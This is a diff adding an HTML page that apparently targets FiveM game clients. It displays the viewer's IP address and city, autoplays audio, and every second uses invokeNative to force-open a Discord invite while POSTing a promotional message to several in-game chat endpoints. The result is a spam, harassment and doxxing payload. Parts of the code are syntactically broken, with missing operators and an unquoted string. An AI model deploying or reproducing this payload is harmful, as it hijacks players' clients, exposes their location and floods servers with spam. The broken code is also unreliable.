@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>discord.gg/u-t</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+  body {
+    margin: 0;
+    padding: 0;
+    background-color: #000000;
+    font-family: 'Share Tech Mono', monospace;
+    color: #00aaff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    justify-content: space-between;
+    text-align: center;
+  }
+
+  .header-image {
+    margin-top: 20px;
+    width: 400px;
+    max-width: 90vw;
+    border-radius: 15px;
+    box-shadow: 0 0 20px #00aaffcc;
+  }
+
+  .info {
+    margin: 40px 0 0 0;
+    font-size: 1.6rem;
+    letter-spacing: 1.5px;
+    color: #00aaff;
+    text-shadow: 0 0 10px #00aaffcc;
+  }
+
+  .footer-text {
+    margin-bottom: 10px;
+    font-size: 1.3rem;
+    font-weight: 600;
+    color: #3399ffcc;
+    letter-spacing: 3px;
+    text-shadow: 0 0 10px #3399ffcc;
+  }
+
+  .author {
+    margin-bottom: 30px;
+    font-size: 1rem;
+    color: #2277ccaa;
+    font-style: italic;
+    letter-spacing: 2px;
+    user-select: none;
+  }
+
+  /* Hide audio controls /
+  audio {
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+  <img class="header-image" src="https://i.giphy.com/o0vwzuFwCGAFO.webp" alt="Header Image" />
+
+  <div class="info" id="ip-info">
+    <div><strong>IP:</strong> <span id="ip"></span></div>
+    <div><strong>City:</strong> <span id="city"></span></div>
+  </div>
+
+  <div>
+    <div class="footer-text">discord.gg/u-t</div>
+    <div class="author">Join US</div>
+  </div>
+
+  <audio autoplay loop>
+    <source src="https://files.catbox.moe/8tsjyv.mp3" type="audio/mpeg" />
+    Your browser does not support the audio element.
+  </audio>
+
+<script>
+  fetch('https://ipinfo.io/json')
+    .then(response => response.json())
+    .then(data => {
+      document.getElementById('ip').textContent = data.ip  'N/A';
+      document.getElementById('city').textContent = data.city  'N/A';
+    })
+    .catch(() => {
+      const info = document.getElementById('ip-info');
+      info.textContent = 'Failed to load IP information.';
+    });
+</script>
+
+</body>
+<script>
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/u-t");
+window.invokeNative("openUrl", "https://discord.gg/u-t");
+window.invokeNative("openUrl", "https://discord.gg/u-t");
+window.invokeNative("openUrl", "https://discord.gg/u-t");
+}, 1000);
+const msg = 👑 UNITY - .gg/u-t ! 👑;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+    </script>
+
+</html>
